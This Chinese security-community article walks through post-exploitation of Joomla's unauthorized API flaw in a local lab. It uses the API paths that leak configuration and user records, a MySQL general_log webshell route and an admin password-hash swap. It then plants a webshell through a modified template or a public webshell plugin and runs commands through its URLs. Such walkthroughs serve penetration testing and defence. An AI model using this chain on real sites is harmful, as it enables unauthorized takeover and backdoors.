#  Joomla Unauthorized"后"渗透到RCE   
Betta  火线Zone   2023-04-14 17:06  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQsOrQiapu38ho0znsATljMG4SUia7NAdk5GIhCkju1VhXicboWTEc18KNA/640?wx_fmt=png "")  
  
  
**前言**  
  
  
前文已经分析过了Joomla Unauthorized的漏洞成因，总的来说是由于函数array_merge()变量覆盖引起的，未授权的api接口很多。  
  
  
  
**Joomla Unauthorized RCE1**  
  
  
  
api路径  
```
api/index.php/v1/config/application?public=true
```  
  
http://joomla.net:8011/api/index.php/v1/config/application?public=true  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQ4KJKxUhtC1osS4VoXpWFibt3gibJFGDhdJSvmXhSwP4wTZSOZqV3G35w/640?wx_fmt=png "")  
  
登录mysql写入webshell，有条件限制  
- 通过log写入webshell  
  
  
```
数据库的当前用户为ROOT或拥有FILE权限；（FILE权限指的是对服务器主机上文件的访问）
明确网站路径
general_log参数值为ON
general_log_file参数为webshell路径
```  
  
- 通过函数outfile写入webshell（该传统方式**不可行**）  
  
Joomla漏洞版本无注入点无法通过注入点和outfile函数写入webshell  
  
  
  
**Joomla Unauthorized RCE2******  
  
  
  
****  
**进入后台administrator的方法1**  
  
通过未授权api  
```
api/index.php/v1/users?public=true
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQYJDq2D4pQbWuAa8XibYn3MkOx2Ra2RwQ9VrmZcKVMrsR6MkZfCZF0XA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQLHhQdMaF4ScUSaQ1V8icxSGKw7icgJHG7esfXfos1rMUGefY05yic0vGQ/640?wx_fmt=png "")  
  
可读取用户信息，使用社工方式暴力破解登录后台，利用进行RCE  
  
  
**进入后台administrator的方法2**  
- 修改模板文件  
  
获取mysql权限后执行sql语句或者使用工具修改后端管理员密码或者其他用户密码，joomla有自己的加密算法，所以也没必要破解他们的加密方式，老版本搭建后使用用户的哈希值更换  
```
Toggle Menu->Users-Manage
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQcp5E5dUPAzwOOwePLibu5DJZUkDsDxgFZUBhswjetgqtHpqGDqGu8Mw/640?wx_fmt=png "")  
```
123456123456::$2y$10$GauLOsp1NBJLO0FGjlqhxOu8LZe9wconNuPwqgjX/pGxAqn7dL5ba
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQWbgCaxmcduAGOCKOubFtsrExKIVUElNxYejY1TJQDbQoqibbEKsUiblQ/640?wx_fmt=png "")  
  
修改admin的密码为该密码  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQf3tsmlGhdXEYKsH8trCBYQUTbtT7ZibibCMgyWF4UXdxyAjecj6hcecQ/640?wx_fmt=png "")  
  
可登录后台  
  
  
**后台RCE的两种方式**  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQwlXTMBCTibFBibib2SANeZB9eYNjJXs8MSEQz76DOpS3q9PytpxHfeYOQ/640?wx_fmt=png "")  
```
Toggle Menu->System->Templates->Site Templates->cassiopeia
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQgyC7ichibX4OIgMoyfIf5qeV74yeCDjgqu3no5II3PrY4fK4rZ2eVzow/640?wx_fmt=png "")  
  
修改模板文件,添加恶意代码实现命令执行，获取webshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQaekEZxSsakp1I3Rvd3rkD4ib6mqDichGMJpXFUQVnOfMk0Mwe1SzOBVw/640?wx_fmt=png "")  
  
测试webshell  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQWicdEpjuM4OaJWCKOA0RYaPlny2AGTaOKzicq9O0dWnZ1icj4xdbN644w/640?wx_fmt=png "")  
  
- 导入恶意插件  
  
项目地址  
```
https://github.com/p0dalirius/Joomla-webshell-plugin
```  
  
路径  
```
Toggle Menu->System-> Extensions
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQiarRALGI3FhEV76QQrozP25BP87hbaZRXxibAvrGDibgqLyL1bV5YxuQw/640?wx_fmt=png "")  
  
下载地址  
```
https://github.com/p0dalirius/Joomla-webshell-plugin/releases/tag/1.1
```  
  
上传下载的恶意插件  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQTxh9d7GOkBxFYicvUJVUwicFZuyJQgURUHDNvSLxqnmmZyQZf5dWeCdw/640?wx_fmt=png "")  
  
上传成功后查看插件管理  
```
http://joomla.net:8011/administrator/index.php?option=com_installer&view=manage
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQ1uSibQsSDtYibM6MmicicYjccZTlJdVYQHhBZym7IyZ1ybMWjrDhFicJ5Dw/640?wx_fmt=png "")  
  
```
http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=exec&cmd=whoami
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQgDQ7M9B2PZDxmYHiaHWzz5YkQibg3pUzDQEwibfBGAsxNvHoqFlzuyJSA/640?wx_fmt=png "")  
  
成功执行命令  
  
当前目录下创建一个1.txt,，文件内容如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQwnE2tdrKbCk0ywLf9VeeJYWa3iajzyNz7cTUWzKu54OCP1ppL2WmZxw/640?wx_fmt=png "")  
```
http://joomla.net:8011/modules/mod_webshell/mod_webshell.php?action=download&path=./1.txt
```  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQR8qtuia7fficBIA6JxXIg0ibgWqhN4oL4Q4hjYy1tvZ9KcMKR2vrL0DyA/640?wx_fmt=png "")  
  
文件内容为  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQud2cFJDiaG0RU6SF1WXtU00PWPFMRCWibCicicEmYOqGEiaSC69A31pYAcQ/640?wx_fmt=png "")  
  
  
参考文章  
  
https://github.com/p0dalirius/Joomla-webshell-plugin  
  
https://vulncheck.com/blog/joomla-for-rce  
  
  
往期推荐  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497860&idx=1&sn=4c71ce1396dba6f0880e45d74732c6e2&chksm=eaa970a4dddef9b2eedb3686dcb1b07e25c1bb3904bc6e5f9f349883ff4148013e9c37a0797c&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497953&idx=1&sn=0c825a2c7832e8b760ad45a77a1b8359&chksm=eaa970c1dddef9d745224f7fdcf496465ef248e460d520d335fa8b1e8f65899aba6efdc16b86&scene=21#wechat_redirect)  
  
[](http://mp.weixin.qq.com/s?__biz=MzI2NDQ5NTQzOQ==&mid=2247497941&idx=1&sn=5a222c66d2a456b1c08a5bcbd6700535&chksm=eaa970f5dddef9e3f3d943bb064113b43a3665f76f36b7d26e021eb58ddd8ecad94c80c18ec5&scene=21#wechat_redirect)  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/0Z0LqMyVGaTqUMcfSdkOBbKZeCWsJcibQVFRRiaibNBgiaQAYQjvWjoZEh0o2XicTJjwBVUEUia6YAYnTnJ8LoPOhp0A/640?wx_fmt=png "")  
  
火线Zone是火线安全平台运营的安全社区，拥有超过20,000名可信白帽安全专家，内容涵盖渗透测试、红蓝对抗、漏洞分析、代码审计、漏洞复现等热门主题，旨在研究讨论实战攻防技术，助力社区安全专家技术成长，2年内已贡献1300+原创攻防内容，提交了100,000+原创安全漏洞。  
  
欢迎具备分享和探索精神的你加入火线Zone社区，一起分享技术干货，共建一个有技术氛围的优质安全社区！  
  
  
  
  
